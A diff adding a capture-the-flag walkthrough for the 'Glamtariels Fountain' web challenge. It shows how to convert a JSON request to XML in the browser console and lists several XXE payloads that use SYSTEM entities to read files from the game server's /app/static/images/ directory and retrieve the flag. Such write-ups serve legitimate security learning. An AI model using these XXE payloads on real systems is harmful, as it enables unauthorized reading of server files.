@@ -1,0 +1,65 @@
+Glamtariels Fountain (Web Ring 3)
+Webpage: https://glamtarielsfountain.com/
+Objective: Share thoughts, use XXE (a hint), get ring.
+Note1: Instead of using XXE to exfiltrate any information, we are feeding it back to the game as a parameter value.
+Note2: The website resource uses ajax in the js file to make calls to the server. Alternative to the method detailed below, you can edit the payload in the ajax call to actually see the changes in the browser window. Using burpsuite is another alternative.
+
+1) Start with playing the game normally. Drag and drop the following to get KEYWORDs and to the last set of images so we can start the XXE exploits:
+  Kringle => Princess
+  Kringle => Fountain
+  Elf => Princess
+  Elf => Fountain
+  Ring => Princess
+  Boat => Fountain
+  Ring => Fountain => Click Eye
+  Igloo => Fountain
+  1st Blue => Fountain
+  2nd Blue => Fountain
+  Silver => Princess
+  Red => Fountain
+
+2) KEYWORDs along the way:
+  TAMPER (cookies)
+  TRAFFIC FLIES
+  PATH (elf make paths)
+  APP
+  SIMPLE FORMAT (way to track rings)
+  RINGLIST (file, a list)
+  TYPE (of language)
+
+3) Access the web browser's Dev Console (press F12 on the keyboard).
+Copy a request named "dropped" from the Network tab by right clicking on it > Copy > Copy as fetch.
+Paste it into the Console tab.
+Change content-type under header and the value in the body (payload) to submit xml data instead of json.
+
+  "content-type": "application/xml"
+
+  "body": '<imgDrop>img1</imgDrop><who>princess</who><reqType>xml</reqType>'
+
+4) Add xml header and the root tags (www.youtube.com/watch?v=gjm6VHZa_8s):
+  <?xml version="1.0"?><root><imgDrop>img1</imgDrop><who>princess</who><reqType>xml</reqType></root>
+
+5) Add !DOCTYPE and !ENTITY (www.youtube.com/watch?v=gjm6VHZa_8s):
+  <?xml version="1.0"?><!DOCTYPE xxe [<!ENTITY xxe "img1">]><root><imgDrop>&xxe;</imgDrop><who>princess</who><reqType>xml</reqType></root>
+
+6) Change the ENTITY to get the contents of the ringlist and drop it on the princess:
+  <?xml version="1.0"?><!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///app/static/images/ringlist.txt">]><root><imgDrop>&xxe;</imgDrop><who>princess</who><reqType>xml</reqType></root>
+
+7) Keywords going into the file path starts with APP for the first directory. /static/images/ directory is from looking at the network traffic to see other images are from that directory. Princess mentions a RINGLIST and txt extension is a common SIMPLE FORMAT.
+
+8) Go back to the Network tab to see the reply returning pholder-morethantopsupersecret63842.png
+
+9) Just using the Dev Console, requests entered into the Console tab don't update what's displayed in the browser. Since other images live in the /static/images/ directory, just open a new tab to view the PNG at https://glamtarielsfountain.com/static/images/pholder-morethantopsupersecret63842.png
+
+10) The PNG shows an image of a folder with redring.txt and bluering.txt in it. Updating the payload to drop those on the princess just returns flavor text. But the actual game page has a silver ring so update it to drop the silverring:
+  <?xml version="1.0"?><!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/silverring.txt">]><root><imgDrop>&xxe;</imgDrop><who>princess</who><reqType>xml</reqType></root>
+
+11) Step 10 returns next clue redring-supersupersecret928164.png as a reply. So open a new tab to view the image at https://glamtarielsfountain.com/static/images/x_phial_pholder_2022/redring-supersupersecret928164.png
+
+12) The png shows an image with goldring_to_be_deleted.txt written on the red ring. So drop that next:
+  <?xml version="1.0"?><!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt">]><root><imgDrop>&xxe;</imgDrop><who>princess</who><reqType>xml</reqType></root>
+
+13) New keyword is REQ. It sounds like the princess is okay to give it to you in exchange for the silver ring. When dropping the silver ring on the princess, the value for imgDrop parameter is img1. So drop that on her and request the gold ring through the reqType parameter:
+  <?xml version="1.0"?><!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt">]><root><imgDrop>img1</imgDrop><who>princess</who><reqType>&xxe;</reqType></root>
+
+14) Step 13 returns the flag in a reply in the Network tab: goldring-morethansupertopsecret76394734.png
